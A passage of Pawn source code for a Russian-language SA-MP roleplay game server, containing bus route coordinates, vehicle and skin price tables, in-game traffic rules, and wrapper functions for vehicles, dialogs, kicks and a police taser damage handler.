	{2064.9211,2791.1394,12.0889, 2377.2446,2777.5808,13.4632},
	{2377.2446,2777.5808,13.4632, 2657.4561,2655.7881,19.8935},
	{2657.4561,2655.7881,19.8935, 2754.4302,2352.0254,22.6519},
	{2754.4302,2352.0254,22.6519, 2759.6565,2058.3132,18.5774},
	{2759.6565,2058.3132,18.5774, 2721.2461,1902.1896,16.8853},
	{2721.2461,1902.1896,16.8853, 2581.6675,1897.8616,15.9368},
	{2581.6675,1897.8616,15.9368, 2454.5569,1898.2275,15.9303},
	{2454.5569,1898.2275,15.9303, 2364.3430,1890.1602,15.5658},
	{2364.3430,1890.1602,15.5658, 2373.9429,1784.1407,0.0728}, //stop
	{2373.9429,1784.1407,0.0728, 2377.9231,1816.6058,4.2655},
	{2377.9231,1816.6058,4.2655, 2362.5251,1916.9717,15.6740},
	{2362.5251,1916.9717,15.6740, 2235.8438,1908.4125,15.6739},
	{2235.8438,1908.4125,15.6739, 2061.7012,1910.7460,15.6697},
	{2061.7012,1910.7460,15.6697, 1966.6521,1905.8160,15.2850},
	{1966.6521,1905.8160,15.2850, 1966.2227,2031.9053,15.6246},
	{1966.2227,2031.9053,15.6246, 1892.4535,2058.7844,15.6307},
	{1892.4535,2058.7844,15.6307, 1904.2878,2080.7234,15.4610}, //stop
	{1904.2878,2080.7234,15.4610, 1891.6812,2116.0925,15.6748},
	{1891.6812,2116.0925,15.6748, 1893.2928,2227.3604,15.7121}, //stop
	{1893.2928,2227.3604,15.7121, 1891.6407,2275.3711,15.7081},
	{1891.6407,2275.3711,15.7081, 1847.4657,2372.5610,15.7085},
	{1847.4657,2372.5610,15.7085, 1762.8424,2498.1934,15.7201},
	{1762.8424,2498.1934,15.7201, 1773.4479,2549.1833,14.9622},
	{1773.4479,2549.1833,14.9622, 1890.4833,2629.6941,14.9662},
	{1890.4833,2629.6941,14.9662, 1963.8578,2670.8923,14.9604},
	{1963.8578,2670.8923,14.9604, 1995.0597,2759.8228,12.0847},
	{1995.0597,2759.8228,12.0847, 2010.8009,2790.2634,12.0630},
	{2010.8009,2790.2634,12.0630, 1946.4725,2804.2483,12.0593},
	{1946.4725,2804.2483,12.0593, 1788.4209,2795.4749,12.3407},
	{1788.4209,2795.4749,12.3407, 1554.6857,2788.7341,12.5629},
	{1554.6857,2788.7341,12.5629, 1255.4607,2797.0845,13.5627},
	{1255.4607,2797.0845,13.5627, 999.7711,2791.7112,16.4003},
	{999.7711,2791.7112,16.4003, 840.1413,2702.4331,19.0936},
	{840.1413,2702.4331,19.0936, 685.0699,2464.0820,19.9208},
	{685.0699,2464.0820,19.9208, 481.9265,2129.0803,14.1861},
	{481.9265,2129.0803,14.1861, 422.1933,1936.3219,7.7540},
	{422.1933,1936.3219,7.7540, 335.2251,1706.3937,11.7556},
	{335.2251,1706.3937,11.7556, 301.7698,1690.6453,11.7555},
	{301.7698,1690.6453,11.7555, 176.1319,1602.0562,11.7561},
	{176.1319,1602.0562,11.7561, 120.9026,1332.0537,11.7562},
	{120.9026,1332.0537,11.7562, 54.8545,1004.4189,11.7562},
	{54.8545,1004.4189,11.7562, 2.9740,887.3788,11.7566},
	{2.9740,887.3788,11.7566, -151.7391,945.1440,11.7572},
	{-151.7391,945.1440,11.7572, -328.1901,978.0604,11.7568},
	{-328.1901,978.0604,11.7568, -507.2522,978.3248,11.7638},
	{-507.2522,978.3248,11.7638, -577.8218,937.2985,11.7028}, //finish
	{-577.8218,937.2985,11.7028,0.0,0.0,0.0}
};

static const stock Float:BusSchool[][] = {
	{-705.6362,964.0098,12.1720,-394.0353,963.9706,12.0951},
	{-394.0353,963.9706,12.0951,-350.3504,963.8916,12.0951},
	{-350.3504,963.8916,12.0951,-129.0002,923.0370,12.0942},
	{-129.0002,923.0370,12.0942,81.6576,843.8359,12.0929},
	{81.6576,843.8359,12.0929,201.9471,798.8414,12.0951},
	{201.9471,798.8414,12.0951,235.8795,786.4230,12.0924},
	{235.8795,786.4230,12.0924,461.9827,699.8640,12.0941},
	{461.9827,699.8640,12.0941,668.1651,622.1927,12.0941},
	{668.1651,622.1927,12.0941,672.9017,588.3025,12.0941},
	{672.9017,588.3025,12.0941,632.5228,482.1779,12.2911},
	{632.5228,482.1779,12.2911,611.4156,429.1083,12.2850},
	{611.4156,429.1083,12.2850,628.2935,406.6939,12.2530},
	{628.2935,406.6939,12.2530,644.9565,399.8405,12.2284},
	{644.9565,399.8405,12.2284,691.6736,382.5881,12.2456},
	{691.6736,382.5881,12.2456,678.5054,332.9734,12.3053},
	{678.5054,332.9734,12.3053,652.9766,336.0258,12.1041},
	{652.9766,336.0258,12.1041,364.4926,450.4691,12.1077},
	{364.4926,450.4691,12.1077,295.6898,475.5013,12.0952},
	{295.6898,475.5013,12.0952,166.6491,526.6204,12.0931},
	{166.6491,526.6204,12.0931,138.7284,536.9307,12.0941},
	{138.7284,536.9307,12.0941,-30.5667,573.5156,12.0952},
	{-30.5667,573.5156,12.0952,-295.5928,608.0855,12.0950},
	{-295.5928,608.0855,12.0950,-339.5938,615.3359,12.1261},
	{-339.5938,615.3359,12.1261,-371.5832,638.7068,12.0941},
	{-371.5832,638.7068,12.0941,-371.8217,955.3319,12.0951},
	{-371.8217,955.3319,12.0951,-723.4140,978.8903,12.1041},
	{-723.4140,978.8903,12.1041,-743.4382,954.0220,12.2532},
	{-743.4382,954.0220,12.2532,0.0,0.0,0.0}
};

static const stock Float:BusLS[][] = {
	{1808.7693,-1889.6619,13.5441, 1824.0190,-1874.4978,13.4840},
	{1824.0190,-1874.4978,13.4840, 1824.0060,-1773.2596,13.5162},
	{1824.0060,-1773.2596,13.5162, 1824.0614,-1635.0193,13.5162},
	{1824.0614,-1635.0193,13.5162, 1844.6427,-1520.9193,13.5105},
	{1844.6427,-1520.9193,13.5105, 1853.1488,-1389.1710,13.5240},
	{1853.1488,-1389.1710,13.5240, 1852.5815,-1201.0886,22.2652},
	{1852.5815,-1201.0886,22.2652, 1828.0586,-1178.4015,23.7647},
	{1828.0586,-1178.4015,23.7647, 1743.3359,-1159.2402,23.7648},
	{1743.3359,-1159.2402,23.7648, 1657.0310,-1158.5968,23.9014},
	{1657.0310,-1158.5968,23.9014, 1557.1129,-1158.6820,24.0388}, /////////////////
	{1557.1129,-1158.6820,24.0388, 1437.4683,-1158.1476,23.7897},
	{1437.4683,-1158.1476,23.7897, 1376.5890,-1138.8882,23.7887},
	{1376.5890,-1138.8882,23.7887, 1360.5190,-1121.9950,23.8286},
	{1360.5190,-1121.9950,23.8286, 1378.7158,-965.2871,33.8278},
	{1378.7158,-965.2871,33.8278, 1395.1383,-950.7330,34.7365},
	{1395.1383,-950.7330,34.7365, 1482.0538,-975.8360,36.9147},
	{1482.0538,-975.8360,36.9147, 1588.9043,-991.8221,47.5224},
	{1588.9043,-991.8221,47.5224, 1690.7782,-925.4719,52.2945},
	{1690.7782,-925.4719,52.2945, 1710.1456,-811.7196,56.6823},
	{1710.1456,-811.7196,56.6823, 1715.7312,-658.3969,42.8951},
	{1715.7312,-658.3969,42.8951, 1703.9282,-455.4938,33.5071},
	{1703.9282,-455.4938,33.5071, 1677.1586,-251.9822,43.3416},
	{1677.1586,-251.9822,43.3416, 1654.6398,-33.1713,36.6220},
	{1654.6398,-33.1713,36.6220, 1626.1002,136.1207,36.2453},
	{1626.1002,136.1207,36.2453, 1702.3450,390.6835,30.3718},
	{1702.3450,390.6835,30.3718, 1778.0345,612.6203,21.4697},
	{1778.0345,612.6203,21.4697, 1806.4822,812.1041,11.0276},
	{1806.4822,812.1041,11.0276, 1767.3173,852.2102,10.4838},
	{1767.3173,852.2102,10.4838, 1619.8535,852.7777,6.8647},
	{1619.8535,852.7777,6.8647, 1423.8711,863.6336,6.9534},
	{1423.8711,863.6336,6.9534, 1259.5035,935.0343,14.0343},
	{1259.5035,935.0343,14.0343, 1108.6045,837.5462,10.8190},
	{1108.6045,837.5462,10.8190, 951.2515,750.0100,10.8096},
	{951.2515,750.0100,10.8096, 780.5138,689.3925,11.4581},
	{780.5138,689.3925,11.4581, 559.9733,696.3895,3.4388},
	{559.9733,696.3895,3.4388, 367.5167,783.2415,6.5434},
	{367.5167,783.2415,6.5434, 272.1324,877.9490,21.3849},
	{272.1324,877.9490,21.3849, 235.9642,956.7602,28.0319},
	{235.9642,956.7602,28.0319, 244.9654,975.6467,28.3250},
	{244.9654,975.6467,28.3250, 397.9491,1016.9831,28.5701},
	{397.9491,1016.9831,28.5701, 564.1965,1060.3011,28.5695},
	{564.1965,1060.3011,28.5695, 718.3242,1101.9430,28.5811},
	{718.3242,1101.9430,28.5811, 802.7499,1132.6182,28.5613},
	{802.7499,1132.6182,28.5613, 832.3854,1119.7511,29.9747},
	{832.3854,1119.7511,29.9747, 914.5725,941.4826,13.3511},
	{914.5725,941.4826,13.3511, 832.3351,854.2448,12.4807},
	{832.3351,854.2448,12.4807, 890.7936,891.7736,13.4848}, //////////////////
	{890.7936,891.7736,13.4848, 887.9802,1028.9658,16.6697},
	{887.9802,1028.9658,16.6697, 827.2870,1127.1987,30.0681},
	{827.2870,1127.1987,30.0681, 797.9722,1136.6748,28.4726},
	{797.9722,1136.6748,28.4726, 622.5432,1083.0826,28.4664},
	{622.5432,1083.0826,28.4664, 430.2862,1031.9989,28.4727},
	{430.2862,1031.9989,28.4727, 239.7596,980.1387,28.3301},
	{239.7596,980.1387,28.3301, 229.4479,955.5310,28.0652},
	{229.4479,955.5310,28.0652, 299.3630,797.7305,14.8966},
	{299.3630,797.7305,14.8966, 426.2678,601.2230,19.0801},
	{426.2678,601.2230,19.0801, 512.9183,478.3800,19.0631},
	{512.9183,478.3800,19.0631, 615.2172,326.4894,19.7042},
	{615.2172,326.4894,19.7042, 605.2267,308.3843,19.6450},
	{605.2267,308.3843,19.6450, 522.1287,247.3229,14.6816},
	{522.1287,247.3229,14.6816, 511.1678,212.9783,14.1755},
	{511.1678,212.9783,14.1755, 524.8848,55.7221,20.7846},
	{524.8848,55.7221,20.7846, 525.1271,-117.4125,37.5993},
	{525.1271,-117.4125,37.5993, 543.7299,-144.9373,37.3545},
	{543.7299,-144.9373,37.3545, 742.2243,-164.6572,19.2261},
	{742.2243,-164.6572,19.2261, 937.1564,-180.5933,11.0567},
	{937.1564,-180.5933,11.0567, 1089.0780,-190.0154,40.2116},
	{1089.0780,-190.0154,40.2116, 1187.1486,-185.4979,39.7762},
	{1187.1486,-185.4979,39.7762, 1251.4387,-354.2089,4.3749},
	{1251.4387,-354.2089,4.3749, 1228.0728,-559.8834,42.2943},
	{1228.0728,-559.8834,42.2943, 1154.3828,-773.3051,58.0512},
	{1154.3828,-773.3051,58.0512, 1156.1265,-925.4431,43.0940},
	{1156.1265,-925.4431,43.0940, 1180.6953,-953.1128,42.7677},
	{1180.6953,-953.1128,42.7677, 1268.9562,-936.8261,42.3414},
	{1268.9562,-936.8261,42.3414, 1347.3760,-943.0712,34.9112},
	{1347.3760,-943.0712,34.9112, 1359.3085,-961.2700,33.8680},
	{1359.3085,-961.2700,33.8680, 1340.5586,-1122.0743,23.8279},
	{1340.5586,-1122.0743,23.8279, 1358.0342,-1143.0795,23.8027},
	{1358.0342,-1143.0795,23.8027, 1436.1731,-1162.8156,23.7961},
	{1436.1731,-1162.8156,23.7961, 1498.9742,-1163.6650,24.0570},
	{1498.9742,-1163.6650,24.0570, 1656.2780,-1163.5833,23.9116},
	{1656.2780,-1163.5833,23.9116, 1728.9275,-1163.5092,23.7771}, ///////////
	{1728.9275,-1163.5092,23.7771, 1828.8960,-1183.5767,23.7642},
	{1828.8960,-1183.5767,23.7642, 1845.8003,-1200.4696,22.3763},
	{1845.8003,-1200.4696,22.3763, 1846.0093,-1298.4708,13.5051},
	{1846.0093,-1298.4708,13.5051, 1846.3126,-1443.3279,13.5332},
	{1846.3126,-1443.3279,13.5332, 1819.3213,-1590.4891,13.4889},
	{1819.3213,-1590.4891,13.4889, 1819.3759,-1711.7463,13.5161},
	{1819.3759,-1711.7463,13.5161, 1819.2158,-1848.1592,13.5477},
	{1819.2158,-1848.1592,13.5477, 1811.9922,-1888.8358,13.5436},
	{1811.9922,-1888.8358,13.5436, 1788.8031,-1905.1083,13.5291},
	{1788.8031,-1905.1083,13.5291, 0.0, 0.0, 0.0}
};

new TotalObject = 0;
/*stock CreateObjectEx(modelid, Float:X, Float:Y, Float:Z, Float:rX, Float:rY, Float:rZ, Float:DrawDistance = 0.0)
{
    TotalObject ++;
    Streamer_SetVisibleItems(STREAMER_TYPE_OBJECT,MAX_OBJECTS-TotalObject);
	return CreateObject(modelid, X,  Y,  Z,  rX, rY,  rZ, DrawDistance);
}
stock DestroyObjectEx(objectid)
{
	TotalObject --;
    Streamer_SetVisibleItems(STREAMER_TYPE_OBJECT,MAX_OBJECTS-TotalObject);
	return DestroyObject(objectid);
}*/
//#define CreateObject CreateObjectEx
//#define DestroyObject DestroyObjectEx

static const stock WeaponNames[][32] = {
	{"Unarmed (Fist)"}, // 0
	{"Brass Knuckles"}, // 1
	{"Golf Club"}, // 2
	{"Night Stick"}, // 3
	{"Knife"}, // 4
	{"Baseball Bat"}, // 5
	{"Shovel"}, // 6
	{"Pool Cue"}, // 7
	{"Katana"}, // 8
	{"Chainsaw"}, // 9
	{"Purple Dildo"}, // 10
	{"Big White Vibrator"}, // 11
	{"Medium White Vibrator"}, // 12
	{"Small White Vibrator"}, // 13
	{"Flowers"}, // 14
	{"Cane"}, // 15
	{"Grenade"}, // 16
	{"Teargas"}, // 17
	{"Molotov"}, // 18
	{" "}, // 19
	{" "}, // 20
	{" "}, // 21
	{"Colt 45"}, // 22
	{"Colt 45 (Silenced)"}, // 23
	{"Desert Eagle"}, // 24
	{"Normal Shotgun"}, // 25
	{"Sawnoff Shotgun"}, // 26
	{"Combat Shotgun"}, // 27
	{"Micro Uzi (Mac 10)"}, // 28
	{"MP5"}, // 29
	{"AK47"}, // 30
	{"M4A1"}, // 31
	{"Tec9"}, // 32
	{"Country Rifle"}, // 33
	{"Sniper Rifle"}, // 34
	{"Rocket Launcher"}, // 35
	{"Heat-Seeking Rocket Launcher"}, // 36
	{"Flamethrower"}, // 37
	{"Minigun"}, // 38
	{"Satchel Charge"}, // 39
	{"Detonator"}, // 40
	{"Spray Can"}, // 41
	{"Fire Extinguisher"}, // 42
	{"Camera"}, // 43
	{"Night Vision Goggles"}, // 44
	{"Infrared Vision Goggles"}, // 45
	{"Parachute"}, // 46
	{"Fake Pistol"} // 47
};

new bool:PlayerTied[MAX_PLAYERS];

static const stock carsBike[11][2] = {
	{461, 70000},
	{462, 40000},
	{463, 300000},
	{468, 240000},
	{471, 190000},
	{481, 13000},
	{509, 12000},
	{510, 18000},
	{521, 84000},
	{522, 2300000},
	{586, 88000}
};

static const stock carsA[23][2] = {
	{400, 1000000},
	{402, 1200000},
	{405, 950000},
	{410, 900000},
	{415, 2200000},
	{436, 850000},
	{466, 920000},
	{461, 400000},
	{475, 980000},
	{492, 140000},
	{505, 1400000},
	{506, 2500000},
	{516, 150000},
	{560, 1300000},
	{566, 100000},
	{579, 1600000},
	{602, 1300000},
	{507, 140000},
	{550, 1100000},
	{559, 1300000},
	{541, 2100000},
	{451, 1900000},
	{404, 100000}
};

static const stock carsB[23][2] = {
	{404, 200000},
	{412, 190000},
	{424, 120000},
	{429, 60000},
	{445, 120000},
	{458, 160000},
	{467, 92000},
	{474, 90000},
	{479, 230000},
	{492, 200000},
	{496, 130000},
	{507, 210000},
	{516, 150000},
	{540, 400000},
	{542, 100000},
	{543, 88000},
	{546, 80000},
	{547, 85000},
	{549, 60000},
	{565, 130000},
	{566, 150000},
	{576, 90000},
	{575, 60000}
};
//veh 523 Мотобат 525 - евакуатор гаи дпс(596 приорик 597 - 99 598 - иномарка 599 - уаз)
//551 Для спецназ автогазель
//552 Эвакуатор для игроков
static const stock carsC[][2] = {//70 //новый цены
    {412, 9000},
    {424, 10000},
    {467, 19000},
    {474, 28000},
    {478, 28500},
	{400, 3070000},//ABTO
	{402, 1020000},
	{405, 2200000},
	{410, 1000000},
	{411, 400000},
	{415, 3200000},
	{429, 2900000},
	{436, 2850000},
	{439, 180000},
	{442, 1280000},
	{445, 1580000},
	{451, 2580000},
	{466, 2200000},
	{471, 300000},
	{475, 1900000},
	{477, 1390000},
	{489, 230000},
	{491, 220000},
	{492, 180000},
	{494, 1200000},
	{495, 5000000},
	{502, 4100000},
	{503, 3900000},
	{505, 2100000},
	{506, 3500000},
	{507, 1200000},
	{516, 140000},
	{526, 150000},
	{527, 1900000},
	{529, 290000},
	{535, 1800000},
	{540, 990000},
	{541, 4190000},
	{543, 4490000},
	{550, 1200000},
	{558, 4950000},
	{559, 1500000},
	{560, 2200000},
	{562, 2300000},
	{565, 1300000},
	{579, 5100000},
	{602, 2100000},
	{603, 890000},
	{604, 990000},
	{462, 10000},//МОТО
	{463, 190000},
	{468, 390000},
	{521, 50000},
	{522, 1450000},
	{581, 1250000},
	{586, 120000}
};

static const stock JoinRegF[2] = {
	41, 199
};

static const stock JoinRegM[6] = {
    20, 21, 78, 79, 160, 200
};

static const stock JoinShopF[][2] = {
	{12, 50000},//
	{55, 80000},//
	{148, 90000},//
	{138, 100000},//
	{139, 100000},//
	{190, 100000},//
	{145, 120000},//
	{225, 122000},//
	{195, 125000},//
	{193, 130000},//
	{214, 135000},//
	{215, 138000},//
	{152, 140000},//
	{216, 145000},//
	{56, 150000},//
	{292, 155000},//
	{251, 160000},//
	{224, 180000},//
	{178, 220000},//
	{169, 280000},//
	{151, 380000}//
};

static const stock JoinShopM[][2] = { //Мужские скины
    {14, 2000}, //
	{25, 2000}, //
	{22, 15000}, //
	{102, 18000},//
	{7, 20000}, //
	{24, 50000}, //
	{60, 52000},//
	{220, 90000},//
	{180, 100000},//
	{36, 108000},//
	{173, 115000},//
	{184, 118000},//
	{223, 120000},//
	{3, 120000}, //
	{258, 120000},
	{18, 125000},//
	{4, 130000},//
	{252, 135000},//
	{32, 140000},//
	{101, 155000},//
	{18, 160000},//
	{84, 162000},//
	{96, 165000},//
	{142, 165000},//
	{33, 168000},//
	{43, 170000},//
	{51, 170000},//
	{83, 172000},//
	{44, 175000},//
	{47, 180000},//
	{186, 185000},//
	{67, 190000},//
	{48, 200000},//
	{181, 200000},//
	{72, 207000},//
	{29, 215000},//
	{23, 220000},//
	{15, 300000},//
	{249, 400000},//
	{228, 500000},//
	{170, 1000000}
};

static const stock pdd_MSG[][] = {
	{"{ffffff}Общие положения:\n"},
	{"1.Разрешенная скорость передвижения для т/с, по городу - 60 км/ч, за городом - 110 км/ч, на автомагистралях - 150 км/ч.\n"},
	{"2.При необходимости, водитель обязан пропустить т/с со спец.сигналом (Полиция,Служба спасения,Скорая помощь) , а именно: постепенно снижая скорость, прижаться к обочине.\n"},
	{"3.Перекрестки в штате являются нерегулируемыми. Разрешается проезд на запрещающие сигналы светофора.\n"},
	{"4.По требованию работника правоoхранительных органов, водитель обязан остановиться и выполнить все перечисленные требования сотрудника правоохранительных органов.\n"},
	{"5.В случае возникновения ДТП(Дорожно-транспортного происшествия) водитель обязан: \n"},
	{"  а) оставаться на месте ДТП;\n"},
	{"  б) Вызвать сотрудников правоохоранительных органов;\n"},
	{"  в) Вызвать сотрудников скорой помощи, если того требует ситуация.\n"},
	{"6.Водитель обязан пропускать пешеходов, в специальных местах для перехода (перекрестки, специальная разметка).\n"},
	{"7.Водитель обязан осуществлять парковку транспортного средства только на стоянках, либо на обочине, заезжая при этом только 2-мя колесами.\n"},
	{"Запрещается:\n"},
	{"1. Выезд на полосу встречного движения при очевидной угрозе лобового столкновения.\n"},
	{"2. Экстренное торможение без везкой причины, в случае возникновения поломки т/с, по мере возможности Вам следует:\n"},
	{" а) прижаться к обочине;\n"},
	{" б) включить сигнал, оповещающий об аварийной ситуации.\n"},
	{"3.Обгон впереди движущегося т/с с правой стороны,обгон разрешен лишь в случае поворота впереди движущегося т/с.\n"},
	{"4.Нарушение установленного скоростного лимита.\n"},
	{"5.Управление транспортным средством в нетрезвом виде.\n"},
	{"6. Разворот в туннелях строго запрещен.\n"},
	{"7. Движение транспортного средства задним ходом разрешается при условии, что этот маневр будет безопасен и не создаст помех другим участникам движения.\n"},
	{"При необходимости водитель должен прибегнуть к помощи других лиц.\n"},
	{"8. На автомагистралях запрещается: движение задним ходом и учебная езда."}
};

/*Float:S_GetPlayerDistanceFromPoint(playerid, Float:x, Float:y, Float:z)
{
	new NaN_String[5];
	new Float:Distance = GetPlayerDistanceFromPoint(playerid, x, y, z);
	format(NaN_String, 5, "%f", Distance);
	if(!strcmp(NaN_String, "NaN")) return 3000.0;
	return Distance;
}
#define GetPlayerDistanceFromPoint S_GetPlayerDistanceFromPoint

Float:S_GetVehicleDistanceFromPoint(vehicleid, Float:x, Float:y, Float:z)
{
	new NaN_String[5];
	new Float:Distance = GetVehicleDistanceFromPoint(vehicleid, x, y, z);
	format(NaN_String, 5, "%f", Distance);
	if(!strcmp(NaN_String, "NaN")) return 3000.0;
	return Distance;
}
#define GetVehicleDistanceFromPoint S_GetVehicleDistanceFromPoint

stock SetPlayerSkinEx(playerid, skinid)
{
	ClearAnimations(playerid, 1);
	if(skinid > 299) skinid = 299;
	else if(skinid < 0) skinid = 0;
	SetPlayerSkin(playerid, skinid);
}
#if defined _ALS_SetPlayerSkin
	#undef SetPlayerSkin
#else
	#define _ALS_SetPlayerSkin
#endif
#define	SetPlayerSkin SetPlayerSkinEx*/

stock CreateVehicleEx(modelid, Float: X, Float: Y, Float: Z, Float: A, Color1, Color2, SpawnDelay)
{
	new carid = CreateVehicle(modelid, X, Y, Z, A, Color1, Color2, SpawnDelay);
	if(carid == 65535) return 0;
	g_vehicle[carid][veh_x] = X;
	g_vehicle[carid][veh_y] = Y;
	g_vehicle[carid][veh_z] = Z;
	g_vehicle[carid][veh_a] = A;
	return carid;
}
#if defined _ALS_CreateVehicle
	#undef CreateVehicle
#else
	#define _ALS_CreateVehicle
#endif
#define	CreateVehicle CreateVehicleEx

stock AddStaticVehicleExEx(modelid, Float: X, Float: Y, Float: Z, Float: A, Color1, Color2, SpawnDelay)
{
	new carid = AddStaticVehicleEx(modelid, X, Y, Z, A, Color1, Color2, SpawnDelay);
	if(carid == 65535) return 0;
	g_vehicle[carid][veh_x] = X;
	g_vehicle[carid][veh_y] = Y;
	g_vehicle[carid][veh_z] = Z;
	g_vehicle[carid][veh_a] = A;
	strcat(g_vehicle[carid][veh_number], "Г777ОС");
 	g_vehicle[carid][veh_number_label] = CreateDynamic3DTextLabel(g_vehicle[carid][veh_number], 0xFFFFFFFF, 0.0, 0.0, 0.0, 15.0, -1, _, carid);
	return carid;
}
#if defined _ALS_AddStaticVehicleEx
	#undef AddStaticVehicleEx
#else
	#define _ALS_AddStaticVehicleEx
#endif
#define	AddStaticVehicleEx AddStaticVehicleExEx

stock AddStaticVehicleExx(modelid, Float: X, Float: Y, Float: Z, Float: A, Color1, Color2)
{
	new carid = AddStaticVehicle(modelid, X, Y, Z, A, Color1, Color2);
	g_vehicle[carid][veh_x] = X;
	g_vehicle[carid][veh_y] = Y;
	g_vehicle[carid][veh_z] = Z;
	g_vehicle[carid][veh_a] = A;
	strcat(g_vehicle[carid][veh_number], "Г777ОС");
 	g_vehicle[carid][veh_number_label] = CreateDynamic3DTextLabel(g_vehicle[carid][veh_number], 0xFFFFFFFF, 0.0, 0.0, 0.0, 15.0, -1, _, carid);
	return carid;
}
#if defined _ALS_AddStaticVehicle
	#undef AddStaticVehicle
#else
	#define _ALS_AddStaticVehicle
#endif
#define	AddStaticVehicle AddStaticVehicleExx

stock DestroyVehicleEx(vehicleid)
{
	if(!IsValidVehicle(vehicleid)) return 0;
	return (DestroyVehicle(vehicleid));
}
#if defined _ALS_DestroyVehicle
	#undef DestroyVehicle
#else
	#define _ALS_DestroyVehicle
#endif
#define	DestroyVehicle DestroyVehicleEx

stock ShowPlayerDialogEx(playerid, dialogid, style, caption[], info[], button1[], button2[])
{
	ShowPlayerDialog(playerid, dialogid, style, caption, info, button1, button2);
	SetPVarInt(playerid, "USEDIALOGID", dialogid);
	return 1;
}
#if defined _ALS_ShowPlayerDialog
	#undef ShowPlayerDialog
#else
	#define _ALS_ShowPlayerDialog
#endif
#define	ShowPlayerDialog ShowPlayerDialogEx

stock Float:GetDistanceBetweenPoints(Float:X, Float:Y, Float:Z, Float:PointX, Float:PointY, Float:PointZ)
{
	new Float:Distance;
	Distance = floatabs(floatsub(X, PointX)) + floatabs(floatsub(Y, PointY)) + floatabs(floatsub(Z, PointZ));
	return Distance;
}

forward DisconnectPlayer(playerid);
public DisconnectPlayer(playerid)
{
	printf("%s[%d] kicked by DisconnectPlayer (IP: %s)", GetName(playerid), playerid, PI[playerid][pIP]);

    if(playerid != INVALID_PLAYER_ID) Kick(playerid);
}

stock KickEx(playerid, reason[] = "Отсутствует")
{
	printf("%s[%d] kicked by KickEx (%s) (IP: %s)", GetName(playerid), playerid, reason, PI[playerid][pIP]);

	format(kick_reason[playerid], 64, "%s", reason);

    new fix_ping = GetPlayerPing(playerid) + 25;
    return SetTimerEx("DisconnectPlayer", fix_ping>1000?1000:fix_ping, 0, "d", playerid);
}
#if defined _ALS_Kick
	#undef Kick
#else
	#define _ALS_Kick
#endif
#define	Kick KickEx

stock GetTeamID(playerid)
{
	if(PI[playerid][pMember] > 0) return PI[playerid][pMember];
	if(PI[playerid][pLeader] > 0) return PI[playerid][pLeader];
	if(PI[playerid][pTempLeader] > 0) return PI[playerid][pTempLeader];
	return 0;
}

stock GetColor(playerid)
{
    new str[8];
	format(str, sizeof(str), "%06x", PI[playerid][pColor] >>> 8);
	return str;
}

stock GetTeamColor(team)
{
    new str[8];
	format(str, sizeof(str), "%06x", TeamColors[team] >>> 8);
	return str;
}

stock SetPlayerColorEx(playerid, color)
{
    PI[playerid][pColor] = color;
    SetPlayerColor(playerid, color);
    return 1;
}
#if defined _ALS_SetPlayerColor
	#undef SetPlayerColor
#else
	#define _ALS_SetPlayerColor
#endif

stock Float:GetDistanceBetweenPlayers(p1,p2)
{
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

stock IsPlayerApplyAnimation(playerid, animation[])
{
    if(!GetPlayerAnimationIndex(playerid)) return 0;
    new animlib[32], animname[32];
    GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, sizeof(animlib), animname, sizeof(animname));
    if(strcmp(animname, animation, true) == 0) return 1;
	return 0;
}

stock RozetkaList(playerid)
{
    if(PlayersMenu[playerid] > 0) return SendMess(playerid, MSG_BAC_TEXT_DRAW);
	for(new i; i < 7; i++) PlayerTextDrawShow(playerid, PlayerMenu[playerid][i]);
	for(new i; i < 5; i++) PlayerTextDrawShow(playerid, TextDialog[playerid][i]);
	PlayerTextDrawSetString(playerid, PlayerMenu[playerid][2], "PO€EЏKA");
	PlayerTextDrawSetString(playerid, TextDialog[playerid][0], "›E‡AEЏE €AP•ѓ…Џ’");
	PlayerTextDrawSetString(playerid, TextDialog[playerid][1], "ЏE‡EЃOм €A 200P?");
	PlayerTextDrawSetString(playerid, TextDialog[playerid][2], "љ‡• ЊOѓЏBEP„ѓEм…•");
	PlayerTextDrawSetString(playerid, TextDialog[playerid][3], "мA„–…ЏE 'љA‡EE'");
	PlayerTextDrawSetString(playerid, TextDialog[playerid][4], "љ‡• OЏ–Eм‘ 'џAKP‘Џ’'");
	PlayersMenu[playerid] = 8;//Пикап розетки
	SelectTextDraw(playerid, 0xFF4040AA);
	return 1;
}

forward CheckRentCar(playerid);
public CheckRentCar(playerid)
{
	if(GetPlayerState(playerid) != 2) return 1;
	new vehicleid = GetPlayerVehicleID(playerid);
	if(PI[playerid][TaxiCarID] == vehicleid
	|| PI[playerid][BusCarID] == vehicleid
	|| PI[playerid][MechanicCarID] == vehicleid) return 1;
	else RemovePlayerFromVehicle(playerid);
	return 1;
}

forward DrugEffectGone(playerid);
public DrugEffectGone(playerid)
{
	new hour, minute;
	gettime(hour, minute, _);
	SetPlayerTime(playerid, hour, minute);
	SetPlayerWeather(playerid, 7);
	SetPlayerDrunkLevel(playerid, 0);
	return 1;
}

stock SendSpeedometerData(playerid, speedometerData, value)
{
	new BitStream:bs = BS_New();
	BS_WriteValue(bs,
		PR_UINT8, 2,
		PR_UINT8, speedometerData,
		PR_UINT32, value
	);
	PR_SendRPC(bs, playerid, 200);
    BS_Delete(bs);
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid)
{
    if(!IsPlayerConnected(playerid)) return 0;
    if(!IsPlayerConnected(issuerid)) return 0;
    if(PI[playerid][pAFK] >= 3) return 0;
    if(issuerid == INVALID_PLAYER_ID) return 0;
    if(weaponid == 3)
	{
		if(IsACop(issuerid))
		{
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(issuerid, C_RED, "Человек в машине!");
			if(GetPVarInt(playerid, "Tazer") > 0 || pCuff[playerid][pCuffee] == playerid) return SendClientMessage(issuerid, C_RED, "Игрок уже оглушен / в наручниках");

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s оглушил Вас на 15 секунд", GetName(issuerid));
			SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы оглушили %s на 15 секунд", GetName(playerid));
			SendClientMessage(issuerid, COLOR_BLUE, STRING_GLOBAL);

			new string[64];
